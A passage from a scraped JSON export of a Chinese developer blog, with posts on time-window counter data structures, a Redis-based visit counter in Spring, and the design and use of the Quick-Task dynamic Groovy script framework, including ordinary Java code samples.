这个例子只是为了加以理解主题中设计的数据结构的背景，当然可能不是特别合适，因为实际的交易系统中，每笔订单都是会存下来的，而我们单独的剥离处这个数据结构，假设这些数据都不存储，我只关系其中的价格，然后维护n个时间窗口的总额实时更新 II. 数据结构设计1. 基于队列的实现方式基于队列的方式，可算是比较简单的一种实现了，我们依然以一分钟为一个时间片为例进行说明，每次往队列尾添加新的时间片数据；一个轮询的线程不断的取出队列尾部的时间片数据，并判断是否可以从时间窗口中减去，如果可以则直接减，否则等待下一次轮询，对应的数据结构如下 a. 数据结构说明基本结构： 每个时间窗口维护一个队列 每个时间片为队列中的一个元素 大致逻辑： 新来一条数据，在队列头直接插入，并同步更新时间窗口的总数 (amount + cell) 一个定时任务，从对列尾部取出数据，判断是否过期，若是，则更新时间窗口总数(amount - old)，并再从队列尾部取出一条判断；若未过期，则不做任何处理 b. 优缺点优点： 实现简单 逻辑清晰 缺点： 每个时间窗口都需要维护一个队列，额外存储开销，同时也会带来更多地读写io 并发安全问题（同时删除和新增数据时，保证总数不会出现并发问题） 潜在的数据不一致问题 如在更新3min, 10min, 1h的时间窗口的队列数据时，3min, 10min的更新成功，但是1h的更新失败，从而导致1h的总量可能小于1min, 10min 2. 基于大Map的实现方式相比较于队列中每个时间窗口维护一个队列，这里则改成对所有的时间窗口维护一个数据结构，这样维护3min, 10min, 1h等时间窗口的数据，则可以根据这个大的数据结构来计算得出 a. 大数组如果这个数据结构使用Array，会有什么问题？ 由于某些时间片段可能没有数据 如果维护定长的列表，则可能导致大量的空元素 如果维护紧凑的数组，则定期删除过期数据，要么遍历数组，要么记录上次删除的偏移量 b. 大Map采用map结构来记录每个时间片的数据，正好可以解决上面数组面临大量空数据的问题，当然一个缺陷就是没法一次获取多个时间片数据，其对应的数据结构如下 根据这个结构，给出大致的原理： 新增数据时，根据时间戳，定位到map中对应的kv数据，如果存在并没有过期，则累加，否则插入新的数据；总数实时更新 定时任务，删除数据时，根据需要删除的时间戳，定位到map中的kv数据，从总数中删除旧的数据 c. 对比 相比较于持有空数据的数组而言，map结构开销更小的同时，定位旧数据难度没有增加 相比较于紧凑型数组而言，定位旧数据更加便捷，不需要遍历 III. 方案设计分析选择前面的第二种数据结构作为时间窗口的底层数据存储，即采用大Map的方式保存历史时间片段的数据，基于此进行时间窗口的统计 0. 实时计算这个可算是最容易想到了，既然已经保存了所有的历史数据，那么想实现哪些时间窗口的数据，就拿哪些数据进行遍历计算即可 a. 举例说明保存一天的数据，每分钟作为一个时间片段，我们根据时间戳，在当天的分钟数，作为Map中的Key 即时间 2018-07-01 00:00:00 对应的key为0， 2018-07-01 01:03:00 对应的key为 1 * 60+ 3 = 63 若当前时间为 2018-07-01 12:03:01, 则3min的时间窗口数据为: 02分时间片段 + 01分时间片段 + 00分时间片段 即：map.get(12 * 60 + 2) + map.get(12 * 60 + 1) + map.get(12 * 60 + 0) b. 优缺点优点： 逻辑清晰，实现简单，容易理解 缺点： 每次都进行计算，当维护的时间窗口较多时，性能开销较大 1. 定时新增和减数据相比第一种每次进行实时全量计算，下面两个则表示增量计算，即根据当前的时间窗口的值，加上最新的数据并减去过期的数据，从而更新时间窗口的值 这种方案的选择，算是比较容易理解和实现的，简单来说，就是有一个定时器，每隔一段时间加上最新的一个（或多个）时间片段的数据，并移除过期的时间片段 a. 实例说明假设下载有一个3min, 10min, 1h的时间窗口，以其中3min中的时间窗口进行说明 时间窗口内的数据对应的时间段为 2018-07-01 12:00:00 - 2018-07-01 12:03:00 即时间窗口的数据为 map.get(12 * 60 + 2) + map.get(12 * 60 + 1) + map.get(12 * 60 + 0) 根据定时任务，实现增量加减逻辑： 若现在是 12:05:12，则增量加 map.get(12 * 60 + 4), 增量减 map.get(12 * 60 + 0) 若现在是 12:06:12，则增量加 map.get(12 * 60 + 4) + map.get(12 * 60 + 5), 增量减 map.get(12 * 60 + 0) + map.get(12 * 60 + 1) b. 优缺点优点： 不需要遍历计算，只需维护增量变动，性能开销小 同时执行加减，逻辑相对简单 没有并发问题 缺点： 需要维护时间窗口中最新一条数据和最旧一条数据的时间戳，在进行增量时，根据这两个时间戳计算需要增量的时间片数据 数据阻塞导致数据问题，如假设当前为06分，计算时间窗口时将05分时间片的数据计算进去了，但是此时已然有一些05分的数据还没有写到对应的时间片，此时就会导致数据不一致问题 即加入的05分时间片数据为部分数据；而减去时05分时间片数据可能为完整数据 数据少加，从而导致最终时间窗口的数据可能为负数 2. 实时增，定时减过期数据如果前面的方案理解了，这里也就好懂了，主要是为了解决上面一种方案中数据阻塞导致错误减的问题，我们采用实时加数据的方案 a. 方案解释说明前面的说明，可能漏掉了一点，即Map结构的维护逻辑，这里一并给出说明 每次新来一条数据Record时，执行以下步骤 计算在Map中的位置index，取出对应的时间片数据 data 若data未空，或data为过期数据，则data=record并写回Map; 否则 data += recorde 写回Map 时间窗口数据window，判断record对于window是否为有效数据（即判断record对应的时间戳与window上次减数据的时间戳，若小，则表示record数据window已经减过的时间片，表示无效） 有效数据，则 window += record 无效数据，则丢弃 定时任务实现数据减： 根据当前时间戳，计算需要删除的时间戳 newRemove 获取时间窗口中，上次删除数据对应的时间戳 oldRemove 则需要删除的数据为 [oldRemove + 1min, newRemove] 对这个方案一句话进行说明： 没来一个数据，实时的加到时间窗口中；然后每分钟定时的把过期数据删掉 b. 分析这个方案相对前面两个而言，会复杂一些，首先最明显的问题就是并发安全问题和如何保证数据的增量加和减不会有问题 并发问题 增量加和定时减，属于两个线程，所以需要同步机制保证不会出现时间窗口的并发修改问题 可采取的方案无非CAS和锁同步 cas性能更优，但需要存储层支持，或自己实现乐观锁 锁同步，对性能有影响，但实现简单 数据一致性问题 需要考虑几个极端的情况下，数据会不会准确 数据堆积，导致新增的数据不会实时最新的，即这个数据落后于时间窗口的跨度 定时减数据时出现异常的case，在下次恢复时如何保证不会重复减 如大Map的长度为一天1440min时，则当数据出现跨天时，map中数据可能为过期数据时，需要保证不会删除过期数据，也不会加入过期数据 注意： 此外这种方法，与前面几种对比而言，并不是维护一个完整的时间窗口内的数据，因为属于实时增加，所以一个3min的时间窗口，可能是前面3（or2）分钟+最近一分钟内的实时数据 IV. 总结上面介绍了几种方法，当然对于设计阶段的描述，其实最好的是能做一个动图，来演示整个过程，但是能力有限，只能尽力用语言进行描述了，可能不是特别好理解，下面进行抓重点，对上面的整片内容进行简洁说明 1. 数据结构 方案 说明 优点 缺点 队列 每个时间窗口维护一个队列，由一个线程不断的从队列尾获取过期数据，并从时间窗口中减掉，从而维护时间窗口总数 简单容易实现 存储开销大 map Map结构，保存所有的时间窗口的历史数据，由一个线程，根据不同的时间窗口，计算需要删除数据在Map中对应的位置，从而取出数据并删掉 开销小，实现相对容易 批量获取过期数据需要存储端支持（如redis支持hmget, 而内存map则不行） 2. 方案篇 方案 说明 优点 缺点 实时计算 每个时间窗口的总数，直接根据历史数据计算得出 简单易理解 性能开销大 定时增减 一个定时任务，增加最新时间片的数据和删除过期的时间片数据 实现简单，无并发问题 数据一致性问题,数据阻塞可能导致总数为负 实时增，定时减 新来数据，直接加时间窗口；定时任务减过期数据 一致性高，性能相对高 实现复杂，需要注意并发问题和数据一致性问题 V. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/01/180701-计数时间窗口数据结构的设计/"},{"title":"180626-Spring之借助Redis设计一个简单访问计数器","text":"Spring之借助Redis设计一个简单访问计数器为什么要做一个访问计数？之前的个人博客用得是卜算子做站点访问计数，用起来挺好，但出现较多次的响应很慢，再其次就是个人博客实在是访问太少，数据不好看😢… 前面一篇博文简单介绍了Spring中的RedisTemplate的配置与使用，那么这篇算是一个简单的应用case了,主要基于Redis的计数器来实现统计 I. 设计一个简单的访问计数器，主要利用redis的hash结构，对应的存储结构如下: 存储结构比较简单，为了扩展，每个应用（or站点）对应一个APP，然后根据path路径进行分页统计，最后有一个特殊的用于统计全站的访问计数 II. 实现主要就是利用Redis的hash结构，然后实现数据统计，并没有太多的难度，Spring环境下搭建redis环境可以参考: 180611-Spring之RedisTemplate配置与使用 1. Redis封装类针对几个常用的做了简单的封装，直接使用RedisTemplate的excute方法进行的操作，当然也是可以使用 template.opsForValue() 等便捷方式，这里采用JSON方式进行对象的序列化和反序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687public class QuickRedisClient { private static final Charset CODE = Charset.forName(\"UTF-8\"); private static RedisTemplate&lt;String, String&gt; template; public static void register(RedisTemplate&lt;String, String&gt; template) { QuickRedisClient.template = template; } public static void nullCheck(Object... args) { for (Object obj : args) { if (obj == null) { throw new IllegalArgumentException(\"redis argument can not be null!\"); } } } public static byte[] toBytes(String key) { nullCheck(key); return key.getBytes(CODE); } public static byte[][] toBytes(List&lt;String&gt; keys) { byte[][] bytes = new byte[keys.size()][]; int index = 0; for (String key : keys) { bytes[index++] = toBytes(key); } return bytes; } public static String getStr(String key) { return template.execute((RedisCallback&lt;String&gt;) con -&gt; { byte[] val = con.get(toBytes(key)); return val == null ? null : new String(val); }); } public static void putStr(String key, String value) { template.execute((RedisCallback&lt;Void&gt;) con -&gt; { con.set(toBytes(key), toBytes(value)); return null; }); } public static Long incr(String key, long add) { return template.execute((RedisCallback&lt;Long&gt;) con -&gt; { Long record = con.incrBy(toBytes(key), add); return record == null ? 0L : record; }); } public static Long hIncr(String key, String field, long add) { return template.execute((RedisCallback&lt;Long&gt;) con -&gt; { Long record = con.hIncrBy(toBytes(key), toBytes(field), add); return record == null ? 0L : record; }); } public static &lt;T&gt; T hGet(String key, String field, Class&lt;T&gt; clz) { return template.execute((RedisCallback&lt;T&gt;) con -&gt; { byte[] records = con.hGet(toBytes(key), toBytes(field)); if (records == null) { return null; } return JSON.parseObject(records, clz); }); } public static &lt;T&gt; Map&lt;String, T&gt; hMGet(String key, List&lt;String&gt; fields, Class&lt;T&gt; clz) { List&lt;byte[]&gt; list = template.execute((RedisCallback&lt;List&lt;byte[]&gt;&gt;) con -&gt; con.hMGet(toBytes(key), toBytes(fields))); if (CollectionUtils.isEmpty(list)) { return Collections.emptyMap(); } Map&lt;String, T&gt; result = new HashMap&lt;&gt;(); for (int i = 0; i &lt; fields.size(); i++) { if (list.get(i) == null) { continue; } result.put(fields.get(i), JSON.parseObject(list.get(i), clz)); } return result; }} 对应的配置类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.git.hui.story.cache.redis;import com.git.hui.story.cache.redis.serializer.DefaultStrSerializer;import org.springframework.cache.CacheManager;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.PropertySource;import org.springframework.core.env.Environment;import org.springframework.data.redis.cache.RedisCacheManager;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.connection.RedisPassword;import org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;/** * Created by yihui in 18:45 18/6/11. */@Configuration@PropertySource(value = \"classpath:application.yml\")public class RedisConf { private final Environment environment; public RedisConf(Environment environment) { this.environment = environment; } @Bean public CacheManager cacheManager() { return RedisCacheManager.RedisCacheManagerBuilder.fromConnectionFactory(redisConnectionFactory()).build(); } @Bean public RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate&lt;String, String&gt; redisTemplate = new RedisTemplate&lt;&gt;(); redisTemplate.setConnectionFactory(redisConnectionFactory); DefaultStrSerializer serializer = new DefaultStrSerializer(); redisTemplate.setValueSerializer(serializer); redisTemplate.setHashValueSerializer(serializer); redisTemplate.setKeySerializer(serializer); redisTemplate.setHashKeySerializer(serializer); redisTemplate.afterPropertiesSet(); QuickRedisClient.register(redisTemplate); return redisTemplate; } @Bean public RedisConnectionFactory redisConnectionFactory() { LettuceConnectionFactory fac = new LettuceConnectionFactory(); fac.getStandaloneConfiguration().setHostName(environment.getProperty(\"spring.redis.host\")); fac.getStandaloneConfiguration().setPort(Integer.parseInt(environment.getProperty(\"spring.redis.port\"))); fac.getStandaloneConfiguration() .setPassword(RedisPassword.of(environment.getProperty(\"spring.redis.password\"))); fac.afterPropertiesSet(); return fac; }} 2. Controller 支持首先是定义请求参数: 12345@Datapublic class WebCountReqDO implements Serializable { private String appKey; private String referer;} 其次是实现Controller接口，稍稍注意下，根据path进行计数的逻辑： 如果请求参数显示指定了referer参数，则用传入的参数进行统计 如果没有显示指定referer，则根据header获取referer 解析referer，分别对path和host进行统计+1，这样站点的统计计数就是根据host来的，而页面的统计计数则是根据path路径来的 12345678910111213141516171819202122232425262728293031323334353637383940414243@Slf4j@RestController@RequestMapping(path = \"/count\")public class WebCountController { @RequestMapping(path = \"cc\", method = {RequestMethod.GET}) public ResponseWrapper&lt;CountDTO&gt; addCount(WebCountReqDO webCountReqDO) { String appKey = webCountReqDO.getAppKey(); if (StringUtils.isBlank(appKey)) { return ResponseWrapper.errorReturnMix(Status.StatusEnum.ILLEGAL_PARAMS_MIX, \"请指定APPKEY!\"); } String referer = ReqInfoContext.getReqInfo().getReferer(); if (StringUtils.isBlank(referer)) { referer = webCountReqDO.getReferer(); } if (StringUtils.isBlank(referer)) { return ResponseWrapper.errorReturnMix(Status.StatusEnum.FAIL_MIX, \"无法获取请求referer!\"); } return ResponseWrapper.successReturn(doUpdateCnt(appKey, referer)); } private CountDTO doUpdateCnt(String appKey, String referer) { try { if (!referer.startsWith(\"http\")) { referer = \"https://\" + referer; } URI uri = new URI(referer); String host = uri.getHost(); String path = uri.getPath(); long count = QuickRedisClient.hIncr(appKey, path, 1); long total = QuickRedisClient.hIncr(appKey, host, 1); return new CountDTO(count, total); } catch (Exception e) { log.error(\"get referer path error! referer: {}, e: {}\", referer, e); return new CountDTO(1L, 1L); } }} 3. 实例针对这个简单的redis计数，目前在个人的mweb和zweb两个页面已经接入，在页脚处可以看到对应的计数，每次刷新计数会+1 mweb: http://liuyueyi.gitee.io/mweb/#/ zweb: http://liuyueyi.gitee.io/zweb/#/ III. 其他0. 相关博文 180611-Spring之RedisTemplate配置与使用 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/26/180626-Spring之借助Redis设计一个简单访问计数器/"},{"title":"180723-Quick-Task 动态脚本支持框架之结构设计篇","text":"文章链接：https://liuyueyi.github.io/hexblog/2018/07/23/180723-Quick-Task-动态脚本支持框架之结构设计篇/ Quick-Task 动态脚本支持框架之结构设计篇相关博文: 180702-QuickTask动态脚本支持框架整体介绍篇 180719-Quick-Task 动态脚本支持框架之使用介绍篇 前面两篇博文，主要是整体介绍和如何使用；接下来开始进入正题，逐步剖析，这个项目是怎么一步一步搭建起来的；本篇博文则主要介绍基本骨架的设计，围绕项目的核心点，实现一个基础的原型系统 I. 结构分析整体设计图如下： 对于上面的图，得有一个基本的认知，最好是能在脑海中构想出整个框架运行的方式，在正式开始之前，先简单的过一下这张结构图 抓要点 1. 任务执行单元即图中的每个task就表示一个基本的任务，有下面几个要求 统一的继承关系（面向对象的设计理念，执行同一个角色的类由某个抽象的接口继承而来） 任务的执行之间是没有关系的（即任务在独立的线程中调度执行） 2. 任务队列在图中表现很明显了，在内存中会保存一个当前所有执行的任务队列（或者其他的容器） 这个的目的是什么？ 任务脚本更新时，需要卸载旧的任务（因此可以从队列中找到旧的任务，并停掉） 任务脚本删除时，需要卸载旧的任务 3. 任务管理者虽然图中并没有明确的说有这么个东西，但也好理解，我们的系统设计目标就是支持多任务的执行和热加载，那么肯定有个任务管理的角色，来处理这些事情 其要做的事情就一个任务热加载 包括动态脚本更新，删除，新增的事件监听 实现卸载内存中旧的任务并加载执行新的任务 4. 插件系统这个与核心功能关系不大，可以先不care，简单说一下就是为task提供更好的使用的公共类 这里不详细展开，后面再说 II. 设计实现有了上面的简单认知之后，开始进入正题，编码环节，省略掉创建工程等步骤，第一步就是设计Task的API 1. ITask设计抽象公共的任务接口，从任务的标识区分，和业务调度执行，很容易写出下面的实现 1234567891011121314151617181920public interface ITask { /** * 默认将task的类名作为唯一标识 * * @return */ default String name() { return this.getClass().getName(); } /** * 开始执行任务 */ void run(); /** * 任务中断 */ default void interrupt() {}} 前面两个好理解，中断这个接口的目的何在？主要是出于任务结束时的收尾操作，特别是在使用到流等操作时，有这么个回调就比较好了 2. TaskDecorate任务装饰类，为什么有这么个东西？出于什么考虑的？ 从上面可以知道，所有的任务最终都是在独立的线程中调度执行，那么我们自己实现的Task肯定都是会封装到线程中的，在Java中可以怎么起一个线程执行呢？ 一个顺其自然的想法就是包装一下ITask接口，让它集成自Thread，然后就可以简单的直接将任务丢到线程池中即可 1234567891011121314151617181920212223@Slf4jpublic class ScriptTaskDecorate extends Thread { private ITask task; public ScriptTaskDecorate(ITask task) { this.task = task; setName(task.name()); } @Override public void run() { try { task.run(); } catch (Exception e) { log.error(\"script task run error! task: {}\", task.name()); } } @Override public void interrupt() { task.interrupt(); }} 说明： 上面这个并不是必须的，你也完全可以自己在线程池调度Task任务时，进行硬编码风格的封装调用，完全没有问题（只是代码将不太好看而已） 3. TaskContainer上面两个是具体的任务相关定义接口，接下来就是维护这些任务的容器了，最简单的就是用一个Map来保存，uuid到task的映射关系，然后再需要卸载/更新任务时，停掉旧的，添加新的任务，对应的实现也比较简单 1234567891011121314151617181920212223242526272829303132public class TaskContainer { /** * key: com.git.hui.task.api.ITask#name() */ private static Map&lt;String, ScriptTaskDecorate&gt; taskCache = new ConcurrentHashMap&lt;&gt;(); /** * key: absolute script path * * for task to delete */ private static Map&lt;String, ScriptTaskDecorate&gt; pathCache = new ConcurrentHashMap&lt;&gt;(); public static void registerTask(String path, ScriptTaskDecorate task) { ScriptTaskDecorate origin = taskCache.get(task.getName()); if (origin != null) { origin.interrupt(); } taskCache.put(task.getName(), task); pathCache.put(path, task); AsynTaskManager.addTask(task); } public static void removeTask(String path) { ScriptTaskDecorate task = pathCache.get(path); if (task != null) { task.interrupt(); taskCache.remove(task.getName()); pathCache.remove(path); } }} 说明 为什么有两个map，一个唯一标识name为key，一个是task的全路径为key？ 删除任务时，是直接删除文件，所以需要维护一个pathCache 维护name的映射，主要是基于任务的唯一标识出发的，后续可能借此做一些扩展（比如任务和任务之间的关联等） 4. 任务注册前面介绍了任务的定义和装载任务的容器，接下来可以想到的就是如何发现任务并注册了，这一块这里不要详细展开，后面另起一篇详解；主要说一下思路 在设计之初，就决定任务采用Groovy脚本来实现热加载，所以有两个很容易想到的功能点 监听Groovy脚本的变动（新增，更新，删除），对应的类为 TaskChangeWatcher 加载Groovy脚本到内存，并执行，对应的类为 GroovyCompile 5. 执行流程有了上面四个是否可以搭建一个原型框架呢？ 答案是可以的，整个框架的运行过程 程序启动，注册Groovy脚本变动监听器 加载groovy脚本，注册到TaskContainer 将groovy脚本丢到线程池中调度执行 执行完毕后，清除和回收现场 6. 其他当然其他一些辅助的工具类可有可无了，当然从使用的角度出发，有很多东西还是很有必要的，如 通用的日志输出组件（特别是日志输出，收集，检索，经典的ELK场景） 报警相关组件 监控相关 redis缓存工具类 dao工具类 mq消费工具类 http工具类 其他 III. 其他0. 相关博文： 180628-动态任务执行框架想法篇 180702-QuickTask动态脚本支持框架整体介绍篇 项目： https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/23/180723-Quick-Task-动态脚本支持框架之结构设计篇/"},{"title":"180719-Quick-Task 动态脚本支持框架之使用介绍篇","text":"Quick-Task 动态脚本支持框架之使用介绍篇相关博文： 180702-QuickTask动态脚本支持框架整体介绍篇 QuickTask这个项目主要就是为了解决数据订正和接口验证不方便的场景，设计的一个及其简单的动态脚本调度框架，前面一篇整体介绍篇博文，主要介绍了这是个什么东西，整体的运行原理，以及一些简单的使用demo 本篇博文将主要放在应用场景的探讨上，在实际的项目环境中，可以怎么用 I. 框架使用姿势支目前来说，有两种简单的使用方式，一是以独立的jar包来运行，二是集成在已有的项目中运行；下面分别给出介绍 1. 独立jar包运行独立jar包下载，首先下载原始工程，然后打出一个可执行的jar包即可 12345git clone https://github.com/liuyueyi/quick-taskcd quick-task/task-coremvn clean package -Dmaven.test.skipcd targetjava -jar task-core-0.0.1.jar --task /tmp/script 注意上面的jar包执行中，传入的–task参数，这个就是制定监听动态脚本的目录，如上面的脚本，表示框架会自动加载 /tmp/script 目录下的Groovy脚本，并执行 当脚本发生变动时，同样会重新加载更新后的groovy并执行，且会停掉原来的脚本 2. 项目依赖使用作为一个依赖来使用也是可以的，首先是添加pom依赖 123456789101112&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependency&gt; &lt;groupId&gt;com.git.hui&lt;/groupId&gt; &lt;artifactId&gt;task-core&lt;/artifactId&gt; &lt;version&gt;0.0.1&lt;/version&gt;&lt;/dependency&gt; 然后在自己的代码中，显示的调用下面一行代码即可，其中run方法的参数为动态脚本的目录 1new ScriptExecuteEngine().run(\"/tmp/script\"); 对于SpringBoot项目而言，可以在入口Application类的run方法中调用，一个demo如下 123456789101112@SpringBootApplicationpublic class Application implements CommandLineRunner { public static void main(String[] args) throws Exception { SpringApplication app = new SpringApplication(Application.class); app.run(args); } @Override public void run(String... strings) throws Exception { new ScriptExecuteEngine().run(\"/tmp/script\"); }} 对于传统的Spring项目而言，可以新建一个Listener, 监听所有的bean初始化完成之后，开始注册任务引擎，一个可参考的使用case如下 123456789101112131415161718192021222324252627import org.springframework.context.ApplicationEvent;import org.springframework.context.event.ContextRefreshedEvent;import org.springframework.context.event.SmartApplicationListener;import org.springframework.stereotype.Component;@Componentpublic class RegisterTaskEngineListener implements SmartApplicationListener { @Override public boolean supportsEventType(Class&lt;? extends ApplicationEvent&gt; aClass) { return aClass == ContextRefreshedEvent.class; } @Override public boolean supportsSourceType(Class&lt;?&gt; aClass) { return true; } @Override public void onApplicationEvent(ApplicationEvent applicationEvent) { new ScriptExecuteEngine().run(\"/tmp/script\"); } @Override public int getOrder() { return 0; }} 3. 对比小结两种使用方式，从个人角度出发，并没有什么优劣之别，主要还是看具体的业务场景，当希望部署一个独立的任务脚本支持时，可能独立的部署更加的方便，可以在内部进行资源隔离，减少对线上生产环境的影响； 若是单纯的把这个作为一个检测项目运行的辅助工具时，如回调线上的服务接口，判断输出，获取运行项目中的内部参数等，集成在已有的项目中也是比较简单的 II. 实际场景演示使用了这个框架，到底有什么用处呢？或者说是否有一些适用的经典case呢？ 1. 数据查看这种场景比较常见，但一般配套设施齐全的公司，也不会出现这个问题，我们最常见的查看数据有以下几类 DB数据查看 缓存数据查看 内存数据查看 对于DB查看，一般没啥问题，要么可以直连查询要么就是有查询工具；而缓存数据的查询，主要是我们通过序列化后存入的数据，直接从缓存中获取可能并不太友好；对于运行时内存中的数据，就不太好获取了，特别是我们使用Guava缓存的数据，如何在项目运行中判断缓存中的数据是否有问题呢？ 一个查看内存的伪代码 12345678class DemoScript implements ITask { @Override void run() { // 获取目标对象 xxxBean = ApplicationContextHolder.getBean(xxx.class); xxxBean.getXXX(); }} 上面的脚本中，关键就是在于获取目标对象，拿到目标对象之后，再获取内部的局部变量或者内存数据就比较简单了（不能直接访问的局部变量可以通过反射获取） 所以关键就是获取目标对象，有下面几种思路可供参考： 目标对象时单例或者静态类，则可以直接访问 如果项目运行在Spring容器中，且目标对象为Bean，则可以通过 ApplicationContext#getBean 方式获取 2. 接口调用在问题复现的场景下，比较常用了，传入相同的参数，判断接口的返回结果是否ok，用于定位数据异常 1234567891011class DemoScript implements ITask { @Override void run() { // 获取目标对象 xxxService = ApplicationContextHolder.getBean(xxx.class); req = buildRequest(); result = xxxService.execute(req); log.info(\"result: {}\", result); }} 其实实际使用起来和前面没什么区别，无非是线获取到对应的Service，然后执行接口，当然在Spring的生态体系中，一个可展望的点就是支持自动注入依赖的bean 3. 定时任务首先明确一点，在我们的框架中，所有的任务都是隔离的，独立的线程中调度的，当我们希望一个新的任务每隔多久执行一次，可以怎么做？ 一个简单的伪代码如下 12345678910111213141516171819202122class DemoScript implements ITask { private volatile boolean run = false; @Override void run() { run = true; while(true) { doXXX(); try { Thread.sleep(1000); } catch(Exception e) { } if(!run) break; } } @Override void interrupt() { run = false; }} 注意下上面的实现，在run方法中，有一个死循环，一直在重复的调用 doxxx() 方法，在内部通过 Thread.sleep() 来控制频率 在脚本改变或删除之后，框架会回调 interrupt 方法，因此会将上面的run变量设置为false，从而结束死循环 注意： 对于定时任务而言，后续会扩展一个对应ScheduleTask抽象类出来，将循环和中断的逻辑封装一下，对于使用方而言，只需要写业务逻辑即可，不需要关心这些重复的逻辑 4. mq消息消费这种更多的是把这个框架作为一个调度来用，我们接收mq的消息，然后在动态脚本中进行处理，再传给第三方(如果集成在自己的项目中时，一个demo就是可以直接调用项目中的Dao保存数据） 一个RabbitMq的消费任务，对应的伪代码如下 123456789101112131415161718192021222324252627282930313233343536373839class DemoScript implements ITask { @Override void run() { ConnectionFactory fac = new CachingConnectionFactory(); fac.setHost(\"127.0.0.1\"); fac.setPort(5672); fac.setUsername(\"admin\") fac.setPassword(\"admin\") fac.setVirtualHost(\"/\") //创建连接 Connection connection = factory.newConnection(); //创建消息信道 final Channel channel = connection.createChannel(); //消息队列 channel.queueDeclare(queue, true, false, false, null); //绑定队列到交换机 channel.queueBind(queue, exchange, routingKey); Consumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String message = new String(body, \"UTF-8\"); try { System.out.println(\" [\" + queue + \"] Received '\" + message); } finally { channel.basicAck(envelope.getDeliveryTag(), false); } } }; // 取消自动ack channel.basicConsume(queue, false, consumer); }} 注意： 对于RabbitMQ的任务，后续计划封装一个抽象的任务脚本，使业务方只需要关注自己的消息处理即可，上面只是一个业务场景的使用演示 III. 其他0. 相关博文： 180628-动态任务执行框架想法篇 180702-QuickTask动态脚本支持框架整体介绍篇 项目： https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/19/180719-Quick-Task-动态脚本支持框架之使用介绍篇/"},{"title":"180713-Spring之借助Redis设计访问计数器之扩展篇","text":"之前写了一篇博文，简单的介绍了下如何利用Redis配合Spring搭建一个web的访问计数器，之前的内容比较初级，现在考虑对其进行扩展，新增访问者记录 记录当前站点的总访问人数（根据Ip或则设备号） 记录当前访问者在总访问人数中的排名 记录每个子页面的访问计数，记录站点的总访问计数 推荐博文： 180626-Spring之借助Redis设计一个简单访问计数器 180611-Spring之RedisTemplate配置与使用 I. 数据结构设计首先根据上面的几个数据维度进行划分，首先每个站点有自己独立的数据结构，其中访问者记录和每个页面对应的访问计数，肯定是不一样的，下面分别进行说明 1. 访问记录要求记录每个访问者的IP或者设备号，以此来计算总得访问人数，以及当前的访问者在总得访问人数中的位置 List数据结构是否可行？ 每次新来一个访问者，需要与所有的访问者进行对比，判断是否是新的访问者，是则插入列表；不是则查出其对应的位置 如果对redis的数据结构有一点了解，会直到有一个ZSet（有序的集合）正好适合这种场景 确保不会插入重复的数据，每个数据对应的score就是该访问者的首次访问排序 具体的结构类似 12345-- ip (score)127.0.0.1 (1)127.0.0.2 (2)127.0.0.3 (3)... 2. url计数依然沿用之前的Hash数据结构，每个应用申请一个APPKEY，作为hash结构的Key，然后field则为具体的请求域名 具体的结构类似 12345678appKey: // appKey blog.hhui.top: 1314 // 站点对应的总访问数 blog.hhui.top/index: 1303 // 具体的页面对应的访问数 blog.hhui.top/about: 11 // 具体的页面对应的访问数appKey: blog.hhui.top: 1314 blog.hhui.top/index: 1303 blog.hhui.top/about: 11 II. 实现具体的实现其实没有什么特别需要注意的地方，简单说一下几个关键点，一个是Redis的Hash和Zset两个数据结构的访问修改方法；一个则是如何获取访问者的IP 1. 获取客户端IP在Spring中如何获取客户端IP呢？因为我个人的服务器是走的Nginx进行反向代理，所以需要在Nginx层添加一行配置，避免将客户端IP吃掉了 在nginx.con的配置中，转发的地方添加下面的一行 123location / { proxy_set_header X-real-ip $remote_addr;} 然后就可以在代码层，通过解析HttpServletRequest参数，获取真实IP，这段代码网上比较多，直接拿来使用（我这里是放在了一个Filter层，在这里获取服务端关心的一些参数，供整个请求链路使用） 获取客户端IP方法 1234567891011121314151617181920212223242526272829303132333435363738/** * 获取Ip地址 * @param request * @return */private static String getIpAdrress(HttpServletRequest request) { String Xip = 